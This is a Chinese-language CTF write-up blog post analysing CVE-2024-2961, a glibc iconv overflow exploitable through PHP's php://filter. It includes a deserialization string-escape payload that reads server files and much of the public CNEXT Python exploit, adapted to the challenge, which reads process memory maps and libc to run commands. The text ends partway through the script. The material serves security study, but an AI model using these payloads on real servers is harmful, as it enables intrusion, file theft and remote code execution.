<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>CVE-2024-2961 | SoulfulVoyager</title><meta name="author" content="Abernethy"><meta name="copyright" content="Abernethy"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="PHP文件读取到远程代码执行漏洞分析（CVE-2024-2961）漏洞背景CVE-2024-2961概述 漏洞类型：GNU C库(glibc)中iconv()函数的缓冲区溢出漏洞 影响范围： 影响PHP 7.0.0(2015)到8.3.7(2024)近十年版本   漏洞原理： 在将字符串转换为ISO-2022-CN-EXT字符集时 可能导致输出缓冲区溢出最多4个字节 可能使应用程序崩溃或覆盖相邻变">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2024-2961">
<meta property="og:url" content="https://sebastian-alphax.github.io/2025/07/19/CVE-2024-2961/index.html">
<meta property="og:site_name" content="SoulfulVoyager">
<meta property="og:description" content="PHP文件读取到远程代码执行漏洞分析（CVE-2024-2961）漏洞背景CVE-2024-2961概述 漏洞类型：GNU C库(glibc)中iconv()函数的缓冲区溢出漏洞 影响范围： 影响PHP 7.0.0(2015)到8.3.7(2024)近十年版本   漏洞原理： 在将字符串转换为ISO-2022-CN-EXT字符集时 可能导致输出缓冲区溢出最多4个字节 可能使应用程序崩溃或覆盖相邻变">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://sebastian-alphax.github.io/img/icon.png">
<meta property="article:published_time" content="2025-07-19T07:20:08.000Z">
<meta property="article:modified_time" content="2025-07-19T07:58:32.221Z">
<meta property="article:author" content="Abernethy">
<meta property="article:tag" content="CVE">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://sebastian-alphax.github.io/img/icon.png"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "CVE-2024-2961",
  "url": "https://sebastian-alphax.github.io/2025/07/19/CVE-2024-2961/",
  "image": "https://sebastian-alphax.github.io/img/icon.png",
  "datePublished": "2025-07-19T07:20:08.000Z",
  "dateModified": "2025-07-19T07:58:32.221Z",
  "author": [
    {
      "@type": "Person",
      "name": "Abernethy",
      "url": "https://sebastian-alphax.github.io"
    }
  ]
}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://sebastian-alphax.github.io/2025/07/19/CVE-2024-2961/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Failed',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'CVE-2024-2961',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">SoulfulVoyager</span></a><a class="nav-page-title" href="/"><span class="site-name">CVE-2024-2961</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"></div></nav><div id="post-info"><h1 class="post-title">CVE-2024-2961</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-07-19T07:20:08.000Z" title="Created 2025-07-19 15:20:08">2025-07-19</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-07-19T07:58:32.221Z" title="Updated 2025-07-19 15:58:32">2025-07-19</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="PHP文件读取到远程代码执行漏洞分析（CVE-2024-2961）"><a href="#PHP文件读取到远程代码执行漏洞分析（CVE-2024-2961）" class="headerlink" title="PHP文件读取到远程代码执行漏洞分析（CVE-2024-2961）"></a>PHP文件读取到远程代码执行漏洞分析（CVE-2024-2961）</h1><h2 id="漏洞背景"><a href="#漏洞背景" class="headerlink" title="漏洞背景"></a>漏洞背景</h2><h3 id="CVE-2024-2961概述"><a href="#CVE-2024-2961概述" class="headerlink" title="CVE-2024-2961概述"></a>CVE-2024-2961概述</h3><ul>
<li><strong>漏洞类型</strong>：GNU C库(glibc)中iconv()函数的缓冲区溢出漏洞</li>
<li><strong>影响范围</strong>：<ul>
<li>影响PHP 7.0.0(2015)到8.3.7(2024)近十年版本</li>
</ul>
</li>
<li><strong>漏洞原理</strong>：<ul>
<li>在将字符串转换为ISO-2022-CN-EXT字符集时</li>
<li>可能导致输出缓冲区溢出最多4个字节</li>
<li>可能使应用程序崩溃或覆盖相邻变量</li>
</ul>
</li>
<li><strong>利用场景</strong>：<ul>
<li>通过<code>php://filter</code>协议利用漏洞</li>
<li>将文件读取原语提升到远程代码执行(RCE)</li>
</ul>
</li>
</ul>
<h3 id="相关PHP漏洞"><a href="#相关PHP漏洞" class="headerlink" title="相关PHP漏洞"></a>相关PHP漏洞</h3><ul>
<li>多字节字符处理函数中的逻辑缺陷：<ul>
<li><code>mb_strpos()</code>：遇到<code>%9f</code>等不可见字符时自动忽略</li>
<li><code>mb_substr()</code>：将<code>%f0</code>及后续字符视为单个字符</li>
</ul>
</li>
<li>利用特性：<ul>
<li><code>%9f</code>用于增加一个字符计数</li>
<li><code>%f0</code>用于减少三个字符计数</li>
<li>可实现任意字符构造和字符串逃逸</li>
</ul>
</li>
</ul>
<blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mb_strpos这个函数在遇到 %9f 这个不可见字符时，会自动忽略</span><br><span class="line">mb_substr会把 %f0 连着后面的三个字符当成一个字符来识别</span><br></pre></td></tr></table></figure></blockquote>
<p>Attention：</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/gxngxngxn/p/18187578">https://www.cnblogs.com/gxngxngxn/p/18187578</a></p>
<h2 id="XGCTF-西瓜杯-Ezzz-php漏洞利用分析"><a href="#XGCTF-西瓜杯-Ezzz-php漏洞利用分析" class="headerlink" title="XGCTF 西瓜杯 Ezzz_php漏洞利用分析"></a><a target="_blank" rel="noopener" href="https://www.cnblogs.com/dghh/p/18333155">XGCTF</a> 西瓜杯 Ezzz_php漏洞利用分析</h2><h3 id="目标PHP代码"><a href="#目标PHP代码" class="headerlink" title="目标PHP代码"></a>目标PHP代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">substrstr</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$start</span> = <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$data</span>, <span class="string">&quot;[&quot;</span>);</span><br><span class="line">    <span class="variable">$end</span> = <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$data</span>, <span class="string">&quot;]&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">mb_substr</span>(<span class="variable">$data</span>, <span class="variable">$start</span> + <span class="number">1</span>, <span class="variable">$end</span> - <span class="number">1</span> - <span class="variable">$start</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">read_file</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&quot;/etc/passwd&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$start</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;start=<span class="variable">$start</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;start == <span class="string">&quot;gxngxngxn&quot;</span>)&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&#x27;What you are reading is:&#x27;</span>.<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;start&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$readfile</span> = <span class="keyword">new</span> <span class="title function_ invoke__">read_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;start&#x27;</span>]);</span><br><span class="line">    <span class="variable">$read</span>=<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;read&#x27;</span>])?<span class="variable">$_GET</span>[<span class="string">&#x27;read&#x27;</span>]:<span class="string">&quot;I_want_to_Read_flag&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\[|\]/i&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;read&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;NONONO!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$ctf</span> = <span class="title function_ invoke__">substrstr</span>(<span class="variable">$read</span>.<span class="string">&quot;[&quot;</span>.<span class="title function_ invoke__">serialize</span>(<span class="variable">$readfile</span>).<span class="string">&quot;]&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$ctf</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Start_Funny_CTF!!!&quot;</span>;</span><br><span class="line">&#125; Start_Funny_CTF!!!</span><br></pre></td></tr></table></figure>

<h3 id="漏洞利用链"><a href="#漏洞利用链" class="headerlink" title="漏洞利用链"></a>漏洞利用链</h3><ol>
<li><strong>字符串逃逸</strong>：<ul>
<li>利用<code>mb_strpos</code>和<code>mb_substr</code>对多字节字符处理的差异</li>
<li>构造包含<code>%f0abc</code>和<code>%9f</code>的特殊序列实现逃逸</li>
<li>控制<code>read_file</code>对象的<code>filename</code>属性</li>
</ul>
</li>
<li><strong>文件读取原语</strong>：<ul>
<li>逃逸后设置<code>filename</code>为<code>php://filter</code>路径</li>
<li>读取<code>/proc/self/maps</code>获取内存布局信息</li>
<li>下载libc库文件分析符号地址</li>
</ul>
</li>
<li><strong>CVE-2024-2961利用</strong>：<ul>
<li>构造恶意过滤器链触发iconv缓冲区溢出</li>
<li>精心设计堆操作覆盖关键内存结构</li>
<li>劫持PHP内存管理函数实现RCE</li>
</ul>
</li>
</ol>
<h4 id="字符串逃逸"><a href="#字符串逃逸" class="headerlink" title="字符串逃逸"></a>字符串逃逸</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class read_file&#123;</span><br><span class="line">    public <span class="variable">$start</span>;</span><br><span class="line">    public <span class="variable">$filename</span>=<span class="string">&quot;php://filter/convert.base64-encode/resource=/etc/hosts&quot;</span>;</span><br><span class="line">    public <span class="keyword">function</span> __construct(<span class="variable">$start</span>)&#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;start=<span class="variable">$start</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>()&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$this</span>-&gt;start == <span class="string">&quot;gxngxngxn&quot;</span>)&#123;</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">&#x27;What you are reading is:&#x27;</span>.file_get_contents(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">//<span class="variable">$start</span> = <span class="string">&quot;O:9:\&quot;read_file\&quot;:2:&#123;s:5:\&quot;start\&quot;;s:9:\&quot;gxngxngxn\&quot;;s:8:\&quot;filename\&quot;;s:54:\&quot;php://filter/convert.base64-encode/resource=/etc/hosts\&quot;;&#125;&quot;</span>;</span><br><span class="line"><span class="variable">$readfile</span> = new read_file(<span class="string">&#x27;O:9:&quot;read_file&quot;:2:&#123;s:5:&quot;start&quot;;s:9:&quot;gxngxngxn&quot;;s:8:&quot;filename&quot;;s:54:&quot;php://filter/convert.base64-encode/resource=/etc/hosts&quot;;&#125;&#x27;</span>);</span><br><span class="line">//<span class="variable">$a</span>=new read_file(gxngxngxn);</span><br><span class="line">//<span class="variable">$b</span>= serialize(<span class="variable">$a</span>);</span><br><span class="line">//echo <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$c</span>= serialize(<span class="variable">$readfile</span>);</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$c</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//O:9:<span class="string">&quot;read_file&quot;</span>:2:&#123;s:5:<span class="string">&quot;start&quot;</span>;s:9:<span class="string">&quot;gxngxngxn&quot;</span>;s:8:<span class="string">&quot;filename&quot;</span>;s:54:<span class="string">&quot;php://filter/convert.base64-encode/resource=/etc/hosts&quot;</span>;&#125;</span><br><span class="line">//O:9:<span class="string">&quot;read_file&quot;</span>:2:&#123;s:5:<span class="string">&quot;start&quot;</span>;s:125:<span class="string">&quot;O:9:&quot;</span>read_file<span class="string">&quot;:2:&#123;s:5:&quot;</span>start<span class="string">&quot;;s:9:&quot;</span>gxngxngxn<span class="string">&quot;;s:8:&quot;</span>filename<span class="string">&quot;;s:54:&quot;</span>php://filter/convert.base64-encode/resource=/etc/hosts<span class="string">&quot;;&#125;&quot;</span>;s:8:<span class="string">&quot;filename&quot;</span>;s:54:<span class="string">&quot;php://filter/convert.base64-encode/resource=/etc/hosts&quot;</span>;&#125;</span><br><span class="line">//%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%9f</span><br></pre></td></tr></table></figure>

<p>现在要字符串逃逸<code>O:9:&quot;read_file&quot;:2:&#123;s:5:&quot;start&quot;;s:125:&quot;</code>一共38个字节</p>
<p>构造13个%f0abc和1个%9f就能逃逸，%f0能被<code>mb_strpos</code>正常识别，构造13个%f0abc，%9f被<code>mb_strpos</code>忽略，所以这里一共识别13*4&#x3D;52个字符，而<code>mb_substr</code>把%f0abc识别为一个字符，正常识别%9f，从52-13-1&#x3D;38开始，刚好逃逸38个字符。</p>
<p>所以逃逸的payload为?read&#x3D;%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%9f&amp;start&#x3D;O:9:”read_file”:2:{s:5:”start”;s:9:”gxngxngxn”;s:8:”filename”;s:54:”php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;etc&#x2F;hosts”;}</p>
<p><img src="https://blog-abc.oss-cn-beijing.aliyuncs.com/image/1752911794274-1.png" alt="img"></p>
<p>之后用CVE 2024-2961来打</p>
<h3 id="完整利用脚本"><a href="#完整利用脚本" class="headerlink" title="完整利用脚本"></a>完整利用脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># CNEXT: PHP file-read to RCE (CVE-2024-2961)</span></span><br><span class="line"><span class="comment"># Date: 2024-05-27</span></span><br><span class="line"><span class="comment"># Author: Charles FOL @cfreal_ (LEXFO/AMBIONICS)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># TODO Parse LIBC to know if patched</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># INFORMATIONS</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># To use, implement the Remote class, which tells the exploit how to send the payload.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> annotations</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> dataclasses <span class="keyword">import</span> dataclass</span><br><span class="line"><span class="keyword">from</span> requests.exceptions <span class="keyword">import</span> ConnectionError, ChunkedEncodingError</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ten <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">HEAP_SIZE = <span class="number">2</span> * <span class="number">1024</span> * <span class="number">1024</span></span><br><span class="line">BUG = <span class="string">&quot;劄&quot;</span>.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Remote</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;A helper class to send the payload and download files.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    The logic of the exploit is always the same, but the exploit needs to know how to</span></span><br><span class="line"><span class="string">    download files (/proc/self/maps and libc) and how to send the payload.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    The code here serves as an example that attacks a page that looks like:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    ```php</span></span><br><span class="line"><span class="string">    &lt;?php</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    $data = file_get_contents($_POST[&#x27;file&#x27;]);</span></span><br><span class="line"><span class="string">    echo &quot;File contents: $data&quot;;</span></span><br></pre></td></tr></table></figure>

<pre><code>Tweak it to fit your target, and start the exploit.
&quot;&quot;&quot;

def __init__(self, url: str) -&gt; None:
    self.url = url
    self.session = Session()

def send(self, path: str) -&gt; Response:
    &quot;&quot;&quot;Sends given `path` to the HTTP server. Returns the response.
    &quot;&quot;&quot;
    payload_file = &#39;O:9:&quot;read_file&quot;:2:&#123;s:5:&quot;start&quot;;s:9:&quot;gxngxngxn&quot;;s:8:&quot;filename&quot;;s:&#39; + str(
        len(path)) + &#39;:&quot;&#39; + path + &#39;&quot;;&#125;&#39;
    payload = &quot;%9f&quot; * (len(payload_file) + 1) + payload_file.replace(&quot;+&quot;, &quot;%2b&quot;)
    filename_len = &quot;a&quot; * (len(path) + 10)
    url = self.url + f&quot;?start=&#123;filename_len&#125;&amp;read=&#123;payload&#125;&quot;
    return self.session.get(url)

def download(self, path: str) -&gt; bytes:
    &quot;&quot;&quot;Returns the contents of a remote file.
    &quot;&quot;&quot;
    path = f&quot;php://filter/convert.base64-encode/resource=&#123;path&#125;&quot;
    response = self.send(path)
    data = response.re.search(b&quot;What you are reading is:(.*)&quot;, flags=re.S).group(1)
    return base64.decode(data)
</code></pre>
<p>@entry<br>@arg(“url”, “Target URL”)<br>@arg(“command”, “Command to run on the system; limited to 0x140 bytes”)<br>@arg(“sleep”, “Time to sleep to assert that the exploit worked. By default, 1.”)<br>@arg(“heap”, “Address of the main zend_mm_heap structure.”)<br>@arg(<br>    “pad”,<br>    “Number of 0x100 chunks to pad with. If the website makes a lot of heap “<br>    “operations with this size, increase this. Defaults to 20.”,<br>)<br>@dataclass<br>class Exploit:<br>    “””CNEXT exploit: RCE using a file read primitive in PHP.”””</p>
<pre><code>url: str
command: str
sleep: int = 1
heap: str = None
pad: int = 20

def __post_init__(self):
    self.remote = Remote(self.url)
    self.log = logger(&quot;EXPLOIT&quot;)
    self.info = &#123;&#125;
    self.heap = self.heap and int(self.heap, 16)

def check_vulnerable(self) -&gt; None:
    &quot;&quot;&quot;Checks whether the target is reachable and properly allows for the various
    wrappers and filters that the exploit needs.
    &quot;&quot;&quot;

    def safe_download(path: str) -&gt; bytes:
        try:
            return self.remote.download(path)
        except ConnectionError:
            failure(&quot;Target not [b]reachable[/] ?&quot;)

    def check_token(text: str, path: str) -&gt; bool:
        result = safe_download(path)
        return text.encode() == result

    text = tf.random.string(50).encode()
    base64 = b64(text, misalign=True).decode()
    path = f&quot;data:text/plain;base64,&#123;base64&#125;&quot;

    result = safe_download(path)

    if text not in result:
        msg_failure(&quot;Remote.download did not return the test string&quot;)
        print(&quot;--------------------&quot;)
        print(f&quot;Expected test string: &#123;text&#125;&quot;)
        print(f&quot;Got: &#123;result&#125;&quot;)
        print(&quot;--------------------&quot;)
        failure(&quot;If your code works fine, it means that the [i]data://[/] wrapper does not work&quot;)

    msg_info(&quot;The [i]data://[/] wrapper works&quot;)

    text = tf.random.string(50)
    base64 = b64(text.encode(), misalign=True).decode()
    path = f&quot;php://filter//resource=data:text/plain;base64,&#123;base64&#125;&quot;
    if not check_token(text, path):
        failure(&quot;The [i]php://filter/[/] wrapper does not work&quot;)

    msg_info(&quot;The [i]php://filter/[/] wrapper works&quot;)

    text = tf.random.string(50)
    base64 = b64(compress(text.encode()), misalign=True).decode()
    path = f&quot;php://filter/zlib.inflate/resource=data:text/plain;base64,&#123;base64&#125;&quot;

    if not check_token(text, path):
        failure(&quot;The [i]zlib[/] extension is not enabled&quot;)

    msg_info(&quot;The [i]zlib[/] extension is enabled&quot;)

    msg_success(&quot;Exploit preconditions are satisfied&quot;)

def get_file(self, path: str) -&gt; bytes:
    with msg_status(f&quot;Downloading [i]&#123;path&#125;[/]...&quot;):
        return self.remote.download(path)

def get_regions(self) -&gt; list[Region]:
    &quot;&quot;&quot;Obtains the memory regions of the PHP process by querying /proc/self/maps.&quot;&quot;&quot;
    maps = self.get_file(&quot;/proc/self/maps&quot;)
    maps = maps.decode()
    PATTERN = re.compile(
        r&quot;^([a-f0-9]+)-([a-f0-9]+)\b&quot; r&quot;.*&quot; r&quot;\s([-rwx]&#123;3&#125;[ps])\s&quot; r&quot;(.*)&quot;
    )
    regions = []
    for region in table.split(maps, strip=True):
        if match := PATTERN.match(region):
            start = int(match.group(1), 16)
            stop = int(match.group(2), 16)
            permissions = match.group(3)
            path = match.group(4)
            if &quot;/&quot; in path or &quot;[&quot; in path:
                path = path.rsplit(&quot; &quot;, 1)[-1]
            else:
                path = &quot;&quot;
            current = Region(start, stop, permissions, path)
            regions.append(current)
        else:
            print(maps)
            failure(&quot;Unable to parse memory mappings&quot;)

    self.log.info(f&quot;Got &#123;len(regions)&#125; memory regions&quot;)

    return regions

def get_symbols_and_addresses(self) -&gt; None:
    &quot;&quot;&quot;Obtains useful symbols and addresses from the file read primitive.&quot;&quot;&quot;
    regions = self.get_regions()

    LIBC_FILE = &quot;/dev/shm/cnext-libc&quot;

    # PHP&#39;s heap

    self.info[&quot;heap&quot;] = self.heap or self.find_main_heap(regions)

    # Libc

    libc = self._get_region(regions, &quot;libc-&quot;, &quot;libc.so&quot;)

    self.download_file(libc.path, LIBC_FILE)

    self.info[&quot;libc&quot;] = ELF(LIBC_FILE, checksec=False)
    self.info[&quot;libc&quot;].address = libc.start

def _get_region(self, regions: list[Region], *names: str) -&gt; Region:
    &quot;&quot;&quot;Returns the first region whose name matches one of the given names.&quot;&quot;&quot;
    for region in regions:
        if any(name in region.path for name in names):
            break
    else:
        failure(&quot;Unable to locate region&quot;)

    return region

def download_file(self, remote_path: str, local_path: str) -&gt; None:
    &quot;&quot;&quot;Downloads `remote_path` to `local_path`&quot;&quot;&quot;
    data = self.get_file(remote_path)
